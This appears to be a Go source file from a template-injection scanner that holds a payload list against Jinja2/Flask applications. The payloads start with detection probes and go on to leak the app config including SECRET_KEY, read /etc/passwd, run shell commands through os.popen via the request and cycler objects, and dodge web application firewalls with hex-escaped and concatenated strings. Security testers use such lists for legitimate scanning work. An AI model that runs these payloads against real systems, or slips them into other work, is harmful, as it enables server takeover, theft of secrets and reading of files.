package ssti

// Jinja2/Flask payloads (Python).
// Source: PayloadsAllTheThings, HackTricks, PortSwigger
var jinja2Payloads = []Payload{
	// Detection payloads
	{
		Value:           "{{7*7}}",
		Engine:          EngineJinja2,
		Type:            TypeDetection,
		Description:     "Basic Jinja2 math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{{7*'7'}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 fingerprint - repeats string",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "7777777",
	},
	{
		Value:           "{{7+7}}",
		Engine:          EngineJinja2,
		Type:            TypeDetection,
		Description:     "Jinja2 addition",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "14",
	},
	// Config leak payloads
	{
		Value:           "{{config}}",
		Engine:          EngineJinja2,
		Type:            TypeConfigLeak,
		Description:     "Jinja2 config object leak",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Config",
	},
	{
		Value:           "{{config.items()}}",
		Engine:          EngineJinja2,
		Type:            TypeConfigLeak,
		Description:     "Jinja2 config items leak",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "SECRET_KEY",
	},
	{
		Value:           "{{self}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 self object leak",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "TemplateReference",
	},
	// Class traversal payloads
	{
		Value:           "{{self.__class__}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 class introspection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "class",
	},
	{
		Value:           "{{self.__class__.__mro__}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 MRO introspection",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "object",
	},
	{
		Value:           "{{self.__class__.__mro__[2].__subclasses__()}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 subclasses enumeration",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "subprocess",
	},
	// RCE payloads
	{
		Value:           "{{self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
		Engine:          EngineJinja2,
		Type:            TypeFileRead,
		Description:     "Jinja2 file read via file class",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "root:",
	},
	{
		Value:           "{{''.__class__.__mro__[2].__subclasses__()[40]('id').read()}}",
		Engine:          EngineJinja2,
		Type:            TypeRCE,
		Description:     "Jinja2 RCE via subclasses",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		Engine:          EngineJinja2,
		Type:            TypeRCE,
		Description:     "Jinja2 RCE via request object",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{{cycler.__init__.__globals__.os.popen('id').read()}}",
		Engine:          EngineJinja2,
		Type:            TypeRCE,
		Description:     "Jinja2 RCE via cycler object",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// WAF bypass payloads
	{
		Value:           "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
		Engine:          EngineJinja2,
		Type:            TypeRCE,
		Description:     "Jinja2 WAF bypass with hex encoding",
		DetectionMethod: MethodReflection,
		WAFBypass:       true,
	},
	{
		Value:           "{%set a='__cla'+'ss__'%}{{self|attr(a)}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 WAF bypass with string concat",
		DetectionMethod: MethodReflection,
		WAFBypass:       true,
	},
	{
		Value:           "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
		Engine:          EngineJinja2,
		Type:            TypeFingerprint,
		Description:     "Jinja2 WAF bypass hex escapes",
		DetectionMethod: MethodReflection,
		WAFBypass:       true,
	},
}
